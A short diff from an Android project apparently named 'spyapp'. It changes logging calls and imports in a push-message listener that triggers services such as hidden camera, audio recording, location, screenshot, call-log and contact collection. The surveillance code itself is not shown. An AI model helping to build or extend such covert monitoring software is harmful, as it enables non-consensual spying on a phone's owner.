@@ -20,12 +20,12 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.text.TextUtils;
-import android.util.Log;
 
 import com.app.spyapp.SpyApp;
 import com.app.spyapp.common.Const;
 import com.app.spyapp.common.Pref;
 import com.app.spyapp.common.Utils;
+import com.app.spyapp.common.WriteLog;
 import com.app.spyapp.servercall.BookMarkCallService;
 import com.app.spyapp.servercall.CallLogCallService;
 import com.app.spyapp.servercall.ContactCallService;
@@ -37,8 +37,6 @@ import com.app.spyapp.service.AudioRecordService;
 import com.app.spyapp.service.BatteryLevelService;
 import com.app.spyapp.service.GetLocationService;
 import com.app.spyapp.service.HiddenCameraService;
-import com.app.spyapp.service.HistoryService;
-import com.app.spyapp.service.InstallAppListService;
 import com.app.spyapp.service.MMSService;
 import com.app.spyapp.service.SaveFileServices;
 import com.app.spyapp.service.ScreenShotService;
@@ -66,8 +64,8 @@ public class MyGcmListenerService extends GcmListenerService {
         String number = data.getString("number");
         String sms_body = data.getString("sms_body");
         String datetime = data.getString("sms_lastdatetime");
-        Log.d(TAG, "From: " + from);
-        Log.d(TAG, "Message: " + message);
+        WriteLog.E(TAG, "From: " + from);
+        WriteLog.E(TAG, "Message: " + message);
         Utils.showStatus(this, message);
         callServiceForFunctionality(message, number, sms_body, datetime);
 
